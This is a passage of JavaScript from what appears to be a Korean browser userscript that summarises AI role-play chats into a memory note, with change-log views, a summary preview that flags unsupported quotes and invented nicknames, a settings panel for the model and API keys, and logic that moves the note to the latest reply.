      const ok = !src || evFound(q, src); return ok ? quoteHtml(q) : `<p class="chg-ev bad">⚠ 이번 대화에서 못 찾은 근거 · ${esc(evBodyOf(q))}</p>`; };
    const feelStep = l => { const p = l.replace(/^\s*★\s*/, '').split(/\s*[|｜]\s*/); return p.length >= 3 ? `${/^\s*★/.test(l) ? '★ ' : ''}<b>${esc(p[1])}</b> <span class="pdim">· ${esc(p.slice(2).join(' · '))} (${esc(p[0])})</span>` : esc(l); };
    // 칸 제목은 이모지 없이 짧게, 회색 작은 글씨
    const sec = (emo, t, body) => `<section class="pcat cgx"><h5>${t}</h5>${body}</section>`;
    // 누가 → 누구는 위 한 줄, 내용은 아래(들여쓰기 없이)
    const dirTag = d => { const [a, b] = String(d).split(/\s*→\s*/); return b ? `${nameChip(a)}<i class="nar">→</i>${nameChip(b)}` : esc(d); };
    const out = [];
    // 바뀐 것은 아래로 ⤷ 줄: 변경 전 / 변경 후 (처음 생긴 건 새로, 없어진 건 삭제)
    //   진하기: 변경 후·새로 = 검정 / 변경 전 = 회색 / 삭제 = 연회색 줄 그음
    //   알약 색: 새로 파랑 · 변경 후 초록 · 변경 전 회색 · 삭제 연한 빨강
    const pn = (label, html, old = false) => { const k = old ? 'gone' : label === '변경 전' ? 'before' : label === '새로' ? 'new' : 'after';
      return `<p class="chg-l chg-${k}"><em class="rk">${label}</em>${html}</p>`; };
    if (ch.feels.length) out.push(sec('', '감정', ch.feels.map(f => `<div class="chg-row"><p class="chg-who">${dirTag(f.dir)}</p>${f.from ? pn('변경 전', feelStep(f.from)) : ''}${f.added.map(a => pn(f.from ? '변경 후' : '새로', feelStep(a.text)) + ev(a.quote)).join('')}</div>`).join('')));
    if (ch.rels.length) out.push(sec('', '관계·호칭', ch.rels.map(r => `<div class="chg-row"><p class="chg-who">${dirTag(r.dir)}</p>${r.before ? pn('변경 전', esc(r.before)) + pn('변경 후', esc(r.after)) : pn('새로', esc(r.after))}${ev(r.quote)}</div>`).join('')));
    if (ch.people.length) out.push(sec('', '새 인물', `<p class="pline">${ch.people.map(nameChip).join(', ')}</p>`));
    for (const s of ch.sections) {
      let body = '';
      if (s.key === '날짜로그') {
        // 사건 제목은 한 줄(굵게 + 날짜), 그 아래 내용은 ⤷
        for (const l of s.added) {
          if (/^(▸|###)/.test(l)) { const t = l.replace(/^[▸#\s]+/, '').replace(/^\[|\]$/g, ''), m = t.match(/^([^\-]+?)\s*-\s*(.+)$/);
            body += `<p class="chg-new chg-t"><b>${esc(m ? m[2] : t)}</b>${m ? ` <small class="pdim">${esc(m[1])}</small>` : ''}</p>`; }
          else body += `<p class="pnt">${esc(l)}</p>`;
          if (s.quotes?.[l]) body += ev(s.quotes[l]);
        }
        body += s.removed.filter(l => /^(▸|###)/.test(l)).map(l => pn('삭제', `<s>${esc(l.replace(/^[▸#\s]+/, ''))}</s>`, true)).join('');
      } else if (s.added.length && s.removed.length) {
        body = s.removed.map(l => pn('변경 전', esc(l.replace(/^[▸#\s]+/, '')))).join('') + s.added.map(l => pn('변경 후', esc(l.replace(/^[▸#\s]+/, ''))) + (s.quotes?.[l] ? ev(s.quotes[l]) : '')).join('');
      } else {
        body = s.added.map(l => pn('새로', esc(l.replace(/^[▸#\s]+/, ''))) + (s.quotes?.[l] ? ev(s.quotes[l]) : '')).join('') + s.removed.map(l => pn('삭제', `<s>${esc(l.replace(/^[▸#\s]+/, ''))}</s>`, true)).join('');
      }
      out.push(sec('', esc(s.key), body));
    }
    return out.join('');
  }
  // 정리 기록 화면: 회차를 고르면 그 회차에 바뀐 것 + 그 정리 전 노트로 되돌리기
  function changesView(list) {
    if (!list.length) return emptyBox('정리를 한 번 넣으면, 그때부터 회차마다 무엇이 바뀌었는지 여기에 쌓여요.');
    const i = Math.min(Math.max(0, nav.key ?? list.length - 1), list.length - 1), h = list[i], d = new Date(h.at);
    const tabs = `<div class="seg">${list.map((x, j) => `<button data-act="chgpick" data-arg="${j}" aria-pressed="${j === i}">${x.from + 1}~${x.to}턴</button>`).join('')}</div>`;
    return tabs + `<p class="secdesc">${d.getMonth() + 1}/${d.getDate()} 정리 · ${h.from + 1}~${h.to}턴을 더하면서 바뀐 것 · 근거 줄은 빼고 비교해요</p>`
      + changesHtml(changesOf(h.before, h.after))
      + `<div class="jump" style="margin-top:14px"><button data-act="restore" data-arg="${i}"><b>이 정리 전 노트(1~${h.from}턴)로 되돌리기</b><span class="v">미리보기 후 넣기</span></button></div>`;
  }

  // ── 정리 결과 미리보기 ──
  function diffCount(oldBody, newBody) {
    const a = new Set(itemsOf(oldBody)), b = new Set(itemsOf(newBody));
    let add = 0, del = 0; b.forEach(x => { if (!a.has(x)) add++; }); a.forEach(x => { if (!b.has(x)) del++; });
    return { add, del };
  }
  function previewHtml() {
    if (!draft) return '';
    const old = new Map(sections().map(s => [s.key, s.body]));
    const ev = draft.evidence;
    const lost = draft.lost || [], kept = draft.kept || [];
    return `<div class="card" style="margin-bottom:12px">
        <div style="font-size:15px;font-weight:700">1~${draft.turns}턴 기억이 나왔어요</div>
        <div class="muted" style="margin-top:4px">${esc(draft.sub)}</div>
        ${(() => { const before = snapshot?.note?.memory.length || 0, after = joinSections(draft.sections).length;
          const oldLog = blocksOf(sections().find(x => x.key === '날짜로그')?.body || ''), newLog = blocksOf(draft.sections.find(x => x.key === '날짜로그')?.body || '');
          const packedNow = newLog.filter(b => /\(요약\)/.test(b.title)).length - oldLog.filter(b => /\(요약\)/.test(b.title)).length;
          const shrunk = oldLog.filter(o => { const nb = newLog.find(x => x.title === o.title); return nb && nb.lines.join('').length < o.lines.join('').length; }).length;
          return `<div class="sizecmp"><span>${before ? fmt(before) + '자 → ' : ''}<b>${fmt(after)}자</b> / ${fmt(NOTE_LIMIT)}</span>${packedNow > 0 || shrunk ? `<span class="packed">오래된 사건 ${packedNow > 0 ? `${packedNow}묶음 합침` : ''}${packedNow > 0 && shrunk ? ' · ' : ''}${shrunk ? `${shrunk}개 줄임` : ''}</span>` : ''}</div>`; })()}
        ${kept.length ? `<div class="notice" style="margin:10px 0 0">이번 대화에 안 나온 인물 ${kept.length}명(${kept.map(esc).join(', ')})은 예전 기록 그대로 유지했어요.</div>` : ''}
        ${lost.length ? `<div class="hidebox" style="margin-top:10px"><span><b>빠진 인물 ${lost.length}명</b> · ${lost.map(esc).join(', ')}<br>예전 노트엔 있었는데 새 노트에 없어요. 해당 칸을 눌러 다시 적어 주세요.</span></div>` : ''}
        ${draft.madeUp?.length ? `<div class="hidebox" style="margin-top:10px"><span><b>원문에서 못 찾은 호칭·별명 ${draft.madeUp.length}개</b><br>${draft.madeUp.map(w => `「${esc(w)}」<button class="linkbtn" data-act="dropname" data-arg="${esc(w)}">지우기</button>`).join(' ')}${draft.madeUp.length > 1 ? ` <button class="linkbtn" data-act="dropname" data-arg="">모두 지우기</button>` : ''}<br>대화에 나온 적 없는 말이에요. AI가 지어냈을 수 있어요. 진짜 쓰는 호칭이면 그냥 두세요.</span></div>` : ''}
        ${ev.ok + ev.bad ? `<div class="muted" style="margin-top:8px">근거 확인 · 원문에서 찾음 <b style="color:var(--ok)">${ev.ok}</b>${ev.bad ? ` · 못 찾음 <b style="color:var(--bad)">${ev.bad}</b> (고쳐 쓴 인용일 수 있어요)` : ''}</div>` : ''}
      </div>
      ${(() => { if (!draft.before || draft.restore) return '';
        const after = joinSections(draft.sections), ch = changesOf(draft.before.memory, after), n = changeCount(ch);
        const bad = draft.source ? [...ch.feels.flatMap(f => f.added.map(a => a.quote)), ...ch.rels.map(r => r.quote)].filter(q => !q || !evFound(q, draft.source)).length : 0;
        const shrink = draft.before.memory.length > 2000 && after.length < draft.before.memory.length * 0.6
          ? `<div class="hidebox" style="margin:0 0 10px">노트가 정리 전보다 많이 짧아졌어요(${fmt(draft.before.memory.length)}자 → ${fmt(after.length)}자). 빠진 내용이 없는지 아래에서 확인해 주세요.</div>` : '';
        return shrink + `<details class="fold" open><summary><span class="fold-t"><b>✨ 이번에 바뀐 것 ${n}가지</b><small>감정 ${ch.feels.length} · 관계 ${ch.rels.length} · 새 인물 ${ch.people.length}${bad ? ` · ⚠ 근거 확인 필요 ${bad}` : ''}</small></span></summary><div class="fold-b">${changesHtml(ch, draft.source || '')}</div></details>`; })()}
      <div class="list">${draft.sections.map(s => {
        const d = diffCount(old.get(s.key) || '', s.body), info = secInfo(s.key);
        return `<button class="pvrow" data-act="pvEdit" data-arg="${esc(s.key)}"><span class="sw" style="background:${info.color}"></span><b>${esc(s.key)}</b>
          <span class="chg">${d.add ? `<span class="add">+${d.add}</span>` : ''}${d.del ? `<span class="del">−${d.del}</span>` : ''}${!d.add && !d.del ? '<span class="same">그대로</span>' : ''}</span>
          <small>${fmt(s.body.length)}자</small>${icon('chev', 'var(--mute2)', 16)}</button>`;
      }).join('')}</div>
      <div class="card" style="margin-top:12px">
        <div class="muted" data-out="count"></div>
        <details><summary>실제로 들어갈 글 그대로 보기</summary><pre data-out="raw"></pre></details>
        <label class="chk"><input type="checkbox" data-opt="clean" checked>예전 노트는 지우기 (중복 방지)</label>
      </div>`;
  }

  // 설정: 묶음별로 한 줄씩. 고르는 건 드롭다운, 켜고 끄는 건 스위치.
  // 설정: 모든 줄 = 왼쪽 이름 · 오른쪽 조작. 묶음 셋(정리 / AI / 칸·화면) + 정리 기록·도구 한 줄
  function settingsHtml() {
    const opt = (v, label, cur) => `<option value="${v}"${v === cur ? ' selected' : ''}>${label}</option>`;
    const row = (name, control, hint = '') => `<label class="srow"><div><b>${name}</b>${hint ? `<small>${hint}</small>` : ''}</div>${control}</label>`;
    const sw = key => `<input type="checkbox" class="switch" data-set="${key}">`;
    // 설정은 위 알약 탭으로 하나씩: 정리·AI / 칸·화면 / 도구 / 지침. 다른 칸도 화면에는 있어서(숨김) 저장할 때 같이 저장돼요.
    const cur = ['ai', 'view', 'tool', 'backup'].includes(nav.setTab) ? nav.setTab : 'ai';
    const tabs = [['ai', '정리 · AI'], ['view', '칸 · 화면'], ['tool', '도구'], ['backup', '백업·정리 방법']];
    let i = 0; const box = (title, info, body) => { const k = tabs[i++][0]; return `<section data-sec="${k}"${k === cur ? '' : ' hidden'}>${body}</section>`; };
    const seg = `<div class="seg">${tabs.map(([k, l]) => `<button data-act="stab" data-arg="${k}" aria-pressed="${k === cur}">${l}</button>`).join('')}</div>`;
    return seg + box('정리 · AI', `${cycle}턴마다 · ${fmt(NOTE_LIMIT)}자 · <span data-out="keyinfo"></span>`, `
        ${row('정리 주기', `<select data-out="cyclepick">${CYCLES.map(c => opt(c, `${c}턴마다`, cycle)).join('')}</select>`)}
        ${row('노트 크기', `<select data-out="limitpick">${LIMITS.map(c => opt(c, `${fmt(c)}자`, NOTE_LIMIT)).join('')}</select>`, '90% 찰 때까지는 안 줄이고, 넘으면 오래된 사건부터 원인→결과 한 줄로 묶어요 · 사파리는 3만 자 추천')}
        ${row('모델', `<select data-out="modelpick">${MODELS.map(([group, list]) => `<optgroup label="${group}">${list.map(([id, label]) => `<option value="${id}">${label}</option>`).join('')}</optgroup>`).join('')}<option value="">직접 입력</option></select>`)}
        <label class="srow" data-out="modelbox" hidden><div><b>모델 이름</b></div><input type="text" data-set="model" placeholder="${DEFAULT_MODEL}" autocomplete="off"></label>
        ${row('Gemini 키', `<span class="keybox"><input type="password" data-set="apiKey" autocomplete="off" spellcheck="false" placeholder="AIza…"><button type="button" data-act="peek">보기</button></span>`)}
        ${row('Claude 키', `<span class="keybox"><input type="password" data-set="claudeKey" autocomplete="off" spellcheck="false" placeholder="sk-ant-…"><button type="button" data-act="peek">보기</button></span>`)}
        <p class="sfoot">쓸 모델 회사의 키만 넣으면 돼요. 키는 이 브라우저에만 저장돼요. Gemini 키는 Google AI Studio에서 무료로 받을 수 있어요(하루 쓸 수 있는 양 제한 있음).</p>`)
      + box('칸 · 화면', '칸 켜고 끄기 · 자동 옮기기 · 턴 번호', `
        ${OPTIONAL.map(([k, key]) => row(k, sw(key))).join('')}
        ${row('노트 자동 옮기기', sw('autoMove'))}
        ${row('말풍선 턴 번호', sw('badges'))}
        <p class="sfoot">칸을 끄면 다음 정리부터 그 칸을 만들지 않아요.</p>`)
      + box('도구', '들어간 노트 · 기록 · 턴 번호', `<div class="jump">
        <button data-act="injected"><b>들어간 노트 보기</b><span class="v">${snapshot && behindOf(snapshot) ? `${behindOf(snapshot)}개 전 답변` : '직전 답변'}</span></button>
        <button data-act="history"><b>정리 기록 · 쓴 돈</b><span class="v">${usage.filter(r => !r.label).length ? `${usage.filter(r => !r.label).length}번 정리` : ''}</span></button>
        </div>`)
      + box('백업', '다른 방법으로 정리 · 이 방 전체 내보내기 · 불러오기', `

        <div class="jump"><button data-act="gsopen"><b>구글 드라이브 백업</b><span class="v">${nav.gsOn ? '연결됨 · 넣을 때마다 자동' : '연결하기'}</span></button>
        <button data-act="runsheet" data-arg="pick"${busyNow ? ' disabled' : ''}><b>다른 방법으로 정리</b><span class="v">다른 AI · 처음부터</span></button>
        <button data-act="backup"><b>이 방 전체 내보내기</b><span class="v">파일 하나로</span></button>
        <button data-act="etcopen"><b>ETC 비우기</b><span class="v">커뮤·폰 등 · 기억 노트는 그대로</span></button>
        <label class="jumprow"><b>백업 불러오기</b><span class="v">백업·노트 파일 열기</span><input type="file" accept=".json,.txt,application/json,text/plain" data-out="restorefile" hidden></label></div>
        ${nav.gsSheet ? gsSheetHtml() : ''}${nav.etcSheet ? etcSheetHtml() : ''}
        <p class="muted" style="margin:10px 2px 0;font-size:12.5px;line-height:1.6">· 담기는 것: 기억 노트(근거·감정선까지 든 전체본) · 정리 기록 · 명대사 · ETC(폰·컴퓨터·커뮤니티·뉴스·위키·실시간톡) · 쓴 돈 기록<br>
        · API 키는 담기지 않아요(파일이 새도 안전하게).<br>
        · 구글 드라이브를 연결해 두면 정리해서 넣을 때마다 자동으로 올라가고, 새 기기에서 방을 열면 불러올지 물어봐요.<br>
        · 받은 파일을 아이클라우드·구글 드라이브에 저장해 두면, 다른 기기에서 "백업 불러오기"로 열 수 있어요.<br>
        · 불러오면 노트는 확인 화면을 거쳐 채팅에 넣고, ETC·명대사·기록은 이 기기에 바로 들어가요.</p>`);
  }


  // ══════════════════════════════════════════════════════════════
  // 12. 그리기
  // ══════════════════════════════════════════════════════════════
  // 이모지는 글꼴(윈도·맥·안드로이드)마다 줄 안에서 그려지는 높이가 달라 글자 정렬만으로는 위아래로 치우칩니다.
  // 이 기기에서 실제 그려지는 픽셀 위아래를 캔버스로 재고, 화면의 글자 기준선 위치를 읽어 동그라미(칸) 한가운데로 옮깁니다.
  const EMO_SEL = '.av-e,.ig-av,.ph-widget>span,.im-b.emo,.dm-b.emo,.ig-hl i,.ic-x';
  const emoCv = document.createElement('canvas'); emoCv.width = emoCv.height = 240;
  const emoCtx = emoCv.getContext('2d', { willReadFrequently: true }), emoInk = new Map();
  function inkOf(font, t) { // 100px 글자 기준: [기준선 위로 몇 px, 아래로 몇 px]
    const k = font + '|' + t; if (emoInk.has(k)) return emoInk.get(k);
    emoCtx.clearRect(0, 0, 240, 240); emoCtx.font = '100px ' + font; emoCtx.textBaseline = 'alphabetic'; emoCtx.fillText(t, 20, 170);
    const px = emoCtx.getImageData(0, 0, 240, 240).data; let top = -1, bot = -1;
    for (let y = 0; y < 240; y++) for (let x = 0; x < 240; x++) if (px[(y * 240 + x) * 4 + 3] > 20) { if (top < 0) top = y; bot = y; break; }
    const r = top < 0 ? null : [170 - top, bot - 170]; emoInk.set(k, r); return r;
  }
  function centerEmoji(box, tries = 0) {
    const list = [];
    for (const el of box.querySelectorAll(EMO_SEL)) {
      let sp = el.querySelector(':scope>emo-in');
      if (!sp) { const t = [...el.childNodes].filter(n => n.nodeType === 3).map(n => n.data).join('').trim(); if (!t) continue;
        sp = document.createElement('emo-in'); sp.textContent = t;
        for (const n of [...el.childNodes]) if (n.nodeType === 3) n.remove();
        el.prepend(sp); }
      const mk = document.createElement('emo-mk'); sp.append(mk);
      list.push([el.classList.contains('av-e') ? el.parentElement : el, sp, mk, sp.firstChild.data]);
    }
    const reads = list.map(([frame, sp, mk, t]) => { const f = frame.getBoundingClientRect(), cs = getComputedStyle(sp);
      return [f.top + f.height / 2, mk.getBoundingClientRect().top, parseFloat(cs.fontSize), inkOf(cs.fontFamily, t)]; });
    list.forEach(([, sp, mk], i) => { const [mid, base, fs, ink] = reads[i]; mk.remove();
      if (ink && fs && mid) { const dy = mid - (base - (Number.parseFloat(sp.style.transform.slice(11)) || 0) + (ink[1] - ink[0]) / 2 * fs / 100);
        sp.style.transform = Math.abs(dy) <= fs * 0.25 ? `translateY(${dy.toFixed(1)}px)` : ''; } });
    // 창이 아직 안 보일 때 그려졌으면(크기 0) 보일 때까지 잠깐 기다렸다 다시 맞춤
    if (list.length && reads.every(r => !r[0]) && tries < 40) setTimeout(() => centerEmoji(box, tries + 1), 250);
  }
  function render() {
    try { CANON = newFormat() ? persons().map(x => x.name) : []; } catch (_) { CANON = []; }
    try { PROF = newFormat() ? new Map(persons().map(x => [x.name, x])) : new Map(); } catch (_) { PROF = new Map(); }
    try {
      // 노트에 적힌 동물은 모두 예약해 두고, 겹친 사람(두 번째부터)은 예약·사용되지 않은 동물로 바꿔요.
      ANIM = new Map(); const used = new Set([...PROF.values()].map(x => x.emoji).filter(Boolean)), seen = new Set();
      for (const nm of snapshot?.note ? people().keys() : []) { const e = PROF.get(nm)?.emoji; if (!e) continue; if (!seen.has(e)) { seen.add(e); continue; }
        let k = ANIMALS.indexOf(animalOf(nm)); if (k < 0) k = 0; for (let t = 0; t < ANIMALS.length && used.has(ANIMALS[k]); t++) k = (k + 1) % ANIMALS.length; ANIM.set(nm, ANIMALS[k]); used.add(ANIMALS[k]); }
      for (const nm of snapshot?.note ? people().keys() : []) {
        if (PROF.get(nm)?.emoji || ANIM.has(nm)) continue;
        let k = ANIMALS.indexOf(animalOf(nm));
        for (let t = 0; t < ANIMALS.length && used.has(ANIMALS[k]); t++) k = (k + 1) % ANIMALS.length;
        ANIM.set(nm, ANIMALS[k]); used.add(ANIMALS[k]);
      }
    } catch (_) {}
    const n = snapshot?.note, turns = freshTurns();
    const label = snapshot ? `${Math.min(turns, cycle)}/${cycle}` : '기억', due = !!snapshot && turns >= cycle;
    out('fab').textContent = label; ui('.fab').classList.toggle('due', due);
    paintInlineButton(label, due);

    // 머리
    const tabName = nav.tab === 'settings' ? '설정' : '조아메모리ෆ';
    const inSettings = nav.tab === 'settings' && !nav.view;
    let title = tabName, sub = inSettings ? '바꾼 뒤 아래 저장을 눌러 주세요' : n ? `1~${n.turns}턴 기억 · ${turns > cycle ? `정리할 때예요 (+${turns - cycle}턴)` : turns === cycle ? '정리할 때예요' : `다음 정리까지 ${cycle - turns}턴`}` : '아직 정리 전';
    const baseTitle = title, baseSub = sub; // 보기 화면에서도 머리는 앱 제목 그대로(뒤로는 메뉴 바로 아래 줄에)
    if (nav.view === 'person') { title = '인물'; sub = '이 사람에 관한 자료 모아 보기'; }
    if (nav.view === 'graph') { title = '전체 관계도'; sub = '확대해서 한눈에'; }
    if (nav.view === 'injected') { title = '들어간 노트'; sub = '채팅 안에 실제로 있는 그대로'; }
    if (nav.view === 'history') { title = '정리 기록'; sub = '이어진 기억 · 쓴 돈'; }
    if (nav.view === 'run') { title = '정리하기'; sub = '무엇을 · 누가 정리할지 골라요'; }
    if (nav.view === 'edit' || nav.view === 'pvEdit') { title = nav.key + ' 편집'; sub = nav.view === 'pvEdit' ? '넣기 전 결과 고치기' : '저장된 노트 고치기'; }
    if (nav.view === 'preview') { title = '새 기억 확인'; sub = '확인하고 넣어 주세요'; }
    if (nav.view === 'changes') { title = '회차별 바뀐 것'; sub = '정리할 때마다 무엇이 바뀌었는지'; }
    const back = nav.view ? `<button class="hbtn" data-act="back" aria-label="뒤로">${icon('back', 'currentColor', 20)}</button>`
      : inSettings ? `<button class="hbtn" data-act="tab" data-arg="home" aria-label="뒤로">${icon('back', 'currentColor', 20)}</button>` : '';
    const editing = nav.view === 'edit' || nav.view === 'pvEdit';
    // 위 메뉴가 보이는 화면(인물·노트 보기 등)은 뒤로 버튼을 머리 대신 본문 맨 위 한 줄로
    const inline = !!nav.view && !editing && nav.view !== 'preview';
    const backRow = inline ? `<button class="backrow" data-act="back">‹ <b>${esc(title)}</b><span>${sub}</span></button>` : '';
    out('header').innerHTML = editing
      ? `${back}<div class="htitle"><b>${esc(title)}</b><span>${sub}</span></div>
        <button class="hsave" data-act="saveEdit"${busyNow ? ' disabled' : ''}>${nav.view === 'pvEdit' ? '적용' : '저장'}</button>`
      : `${inline ? '' : back}<div class="htitle"><b>${esc(inline ? baseTitle : title)}</b><span>${inline ? baseSub : sub}</span></div>
      ${inSettings ? '' : `<button class="hbtn gear" data-act="tab" data-arg="settings" aria-label="설정">설정</button>`}
      <button class="hbtn" data-act="close" aria-label="닫기">${icon('close', 'currentColor', 20)}</button>`;

    // 본문
    const main = out('main');
    // 다시 그려도 입력 중인 설정 값(키·주소 등)은 남깁니다. 노트를 다시 읽은 뒤 화면이 새로 그려져 타이핑이 지워지지 않게.
    const typed = new Map([...main.querySelectorAll('input[data-set]:not([type=checkbox])')].filter(el => el.value).map(el => [el.dataset.set, el.value]));
    main.style.padding = nav.view === 'graph' ? '0' : '';
    main.innerHTML = devAskHtml() + etcAskHtml() + fullAskHtml() + backRow + (nav.view === 'preview' ? previewHtml()
      : nav.view === 'edit' || nav.view === 'pvEdit' ? editHtml(nav.key)
      : nav.view === 'person' ? personHtml(nav.key)
      : nav.view === 'injected' ? injectedHtml()
      : nav.view === 'graph' ? graphHtml()
      : nav.view === 'history' ? historyHtml()
      : nav.view === 'run' ? runHtml()
      : nav.view === 'changes' ? changesView(histList)
      : nav.tab === 'timeline' ? timelineHtml()
      : nav.tab === 'phone' ? (nav.dev === 'pc' ? pcHtml() : nav.dev === 'board' ? boardHtml() : nav.dev === 'news' ? newsHtml() : nav.dev === 'wiki' ? wikiHtml() : nav.dev === 'live' ? liveHtml() : phoneHtml())
      : nav.tab === 'story' ? memoryHtml(STORY_TABS)
      : nav.tab === 'now' ? memoryHtml(NOW_TABS)
      : nav.tab === 'people' ? peopleHtml()
      : nav.tab === 'feel' ? (snapshot?.note ? peopleHtml('feel', '') : emptyBox('아직 정리한 기억이 없어요.'))
      : nav.tab === 'settings' ? settingsHtml()
      : homeHtml());
    for (const [k, v] of typed) { const el = main.querySelector(`input[data-set="${k}"]`); if (el && !el.value) el.value = v; }

    // 아래
    const bottom = out('bottom');
    if (nav.view === 'preview')
      bottom.innerHTML = `<div class="actions"><button class="btn" data-act="back">버리기</button><button class="btn pri" data-act="apply"${busyNow ? ' disabled' : ''}>채팅에 넣기</button></div>`;
    else if (nav.view === 'edit' || nav.view === 'pvEdit') bottom.innerHTML = '';
    else if (nav.view === 'run') bottom.innerHTML = nav.runBy === 'file'
      ? `<div class="actions" style="grid-template-columns:1fr 1fr"><button class="btn" data-act="extget"${busyNow ? ' disabled' : ''}>① 요청 파일 받기</button>
          <label class="btn pri"${busyNow ? ' style="opacity:.4;pointer-events:none"' : ''}>② 결과 파일 불러오기<input type="file" accept=".txt,text/plain" data-out="extfile" hidden></label></div>`
      : `<div class="actions one"><button class="btn pri" data-act="go"${busyNow ? ' disabled' : ''}>${busyNow ? '정리하는 중…' : '정리 시작'}</button></div>`;
    else bottom.innerHTML = inSettings ? `<div class="actions one"><button class="btn pri" data-act="save">저장</button></div>` : '';
    // 폰: 위쪽 3칸(설정은 톱니). 컴퓨터: 왼쪽 세로 메뉴 4칸. 어느 쪽을 보일지는 CSS가 data-mode로 정합니다.
    // 인물·노트 보기 같은 화면에서도 위 메뉴는 그대로 둡니다. 고치는 중(편집·새 기억 확인)일 때만 숨겨요.
    ui('.screen').dataset.mode = ['edit', 'pvEdit', 'preview'].includes(nav.view) ? 'edit' : nav.view ? 'view' : nav.tab;
    if (nav.tab === 'phone' && !nav.view) centerEmoji(main);
    out('tabs').innerHTML = TABS.filter(([k]) => k !== 'settings').map(([k, l]) => `<button data-act="tab" data-arg="${k}"${nav.tab === k ? ' aria-current="page"' : ''}>${l}</button>`).join('');
    if (nav.view === 'preview') updatePreviewCount();
    if (nav.tab === 'settings' && !nav.view) fillSettings();
    if (nav.view === 'graph') setupGraph(!render.keepGraph); render.keepGraph = false;
  }

  // ══════════════════════════════════════════════════════════════
  // 13. 동작
  // ══════════════════════════════════════════════════════════════
  const behindOf = snap => { const n = snap?.note; if (!n) return null; const chat = snap.all.filter(isChat), i = chat.findIndex(m => msgId(m) === n.carrierId); return i >= 0 ? chat.length - 1 - i : null; };
  // 노트가 뒤로 밀리면 최신 답변으로 다시 붙입니다. AI 호출이 없어서 비용이 들지 않아요.
  let ownUpto = ''; // 이 기기에서 방금 넣은 노트의 정리 지점(다른 기기 알림에서 뺌)
  let moving = false, injectOn = true; // injectOn=false: 어느 채팅방에도 노트를 넣거나 옮기지 않음(ETC만)
  async function moveNote(chatId, snap) {
    const n = snap.note, carrier = pickCarrier(snap.all);
    if (!n || !carrier || msgId(carrier) === n.carrierId) return false;
    await writeMessage(chatId, msgId(carrier), stripBlocks(msgText(carrier)).trimEnd() + buildBlock(n.memory, n.upto, n.turns, n.at || undefined, n.by || ''));
    try {
      const old = await readMessage(chatId, n.carrierId), cleaned = stripBlocks(msgText(old)).trimEnd();
      if (cleaned !== msgText(old)) await writeMessage(chatId, n.carrierId, cleaned);
    } catch (_) { /* 예전 자리 정리가 실패해도 새 자리에는 이미 들어감 */ }
    return true;
  }
  async function refresh() {
    const chatId = chatIdFromPath();
    if (!chatId) return;
    loading = true;
    try {
      let snap = await readSinceLastNote(chatId);
      if (chatIdFromPath() !== chatId) return;
      const behind = behindOf(snap);
      // 노트가 직전 AI 답변에 없으면 옮깁니다. 정리 범위(1~N턴·upto)는 그대로라 다음 정리 턴 수는 안 바뀌어요.
      // behind가 null이면 노트가 리롤로 밀려난 답에 있는 것 → 이때도 옮깁니다.
      injectOn = String(await getValue('inject', 'on')) !== 'off';
      if (injectOn && !moving && !busyNow && snap.note && !snap.note.parked && behind !== 0 && String(await getValue('autoMove', 'on')) !== 'off') {
        moving = true;
        try {
          if (await moveNote(chatId, snap)) {
            snap = await readSinceLastNote(chatId);
            await setValue('moved:' + chatId, JSON.stringify({ at: Date.now(), from: behind }));
            pageToast(`기억(1~${snap.note?.turns || '?'}턴)을 최근 AI 답변 쪽으로 옮겼어요`);
          }
        }
        catch (e) { toast('노트 옮기기 실패 · ' + e.message, 'err'); }
        finally { moving = false; }
      }
      const was = snapshot?.note; // 이 화면이 보던 노트(다른 기기 노트 확인에 씀)
      snapshot = snap;
      usage = await usageOf(chatId);
      phoneData = await phones(chatId); pcData = await pcs(chatId); boardData = await boardOf(chatId); scrubBoardUser(boardData); newsData = await newsOf(chatId); wikiData = await wikiOf(chatId); liveData = await liveOf(chatId); try { etcNames = JSON.parse(String(await getValue('etcnames:' + chatId, '[]')) || '[]'); } catch (_) { etcNames = []; } quoteStore = String(await getValue('quotes:' + chatId, '') || ''); nav.bdNick = String(await getValue('bdNick', '') || ''); histList = await historyOf(chatId);
      try { fullNote = JSON.parse(String(await getValue('full:' + chatId, '') || 'null')); } catch (_) { fullNote = null; }
      // 다른 기기(폰↔컴)에서 정리해 넣은 노트가 채팅에 들어와 있으면 항상 묻습니다.
      //   비교 기준 = 이 기기 것: 이 기기에서 마지막으로 정리한 전체본(있으면), 없으면 이 화면이 보던 노트.
      //   [확인] 채팅에 있는 노트 쓰기  /  [취소] 이 기기 노트로 채팅을 되돌리기
      const c = snap.note;
      const mine = fullNote?.memory ? { memory: fullNote.memory, full: true, upto: fullNote.upto, turns: fullNote.turns || (was?.upto === fullNote.upto ? was.turns : 0), at: fullNote.at || (was?.upto === fullNote.upto ? was.at : ''), by: DEVICE }
        : was ? { memory: was.memory, full: false, upto: was.upto, turns: was.turns, at: was.at, by: was.by } : null;
      const same = !c || !mine || c.parked || (c.upto === mine.upto && (mine.full ? sameAsChat(mine.memory, c.memory) : chatShape(mine.memory) === chatShape(c.memory)));
      // 사파리는 화면으로 돌아오는 순간 뜨는 확인 창을 막거나 바로 닫기도 해서(그러면 '취소'로 처리돼 위험) 창 대신 패널 카드로 묻습니다.
      //   고르기 전에는 아무것도 바꾸지 않아요.
      if (!same) {
        const key = c.upto + '|' + c.at + '|' + chatShape(c.memory).length;
        if (nav.devAsk?.key !== key) { nav.devAsk = { key, chatId, c, mine }; pageToast('다른 기기에서 정리한 기억이 들어왔어요 · 조아메모리를 열어 골라 주세요'); }
      } else if (nav.devAsk?.chatId === chatId) nav.devAsk = null;
      nav.gsOn = !!String(await getValue('gsUrl', '')).trim();
      // ① 사본: 이 기기가 채팅 노트를 볼 때마다(정리를 안 했어도) 최신 노트 사본을 이 브라우저에 남겨요. 언제·어느 기기가 저장했는지도 같이.
      if (snap.note && !snap.note.parked) {
        const n = snap.note, k = n.upto + '|' + n.at + '|' + n.memory.length; let old = null;
        try { old = JSON.parse(String(await getValue('seen:' + chatId, '')) || 'null'); } catch (_) {}
        if (old?.k !== k) await setValue('seen:' + chatId, JSON.stringify({ k, memory: n.memory, upto: n.upto, turns: n.turns, at: n.at, by: n.by || '', savedAt: new Date().toISOString(), savedBy: DEVICE }));
      }
      // 근거·감정선 전체 따라오기: 다른 기기에서 정리한 노트라 이 기기에 전체본이 없으면, 구글 백업이 같은 정리본일 때 그 전체본을 화면용으로 받아요.
      //   채팅은 건드리지 않아요(같은 정리본인지 = 정리 지점이 같고, 채팅에 넣었을 때 모양이 같을 때만).
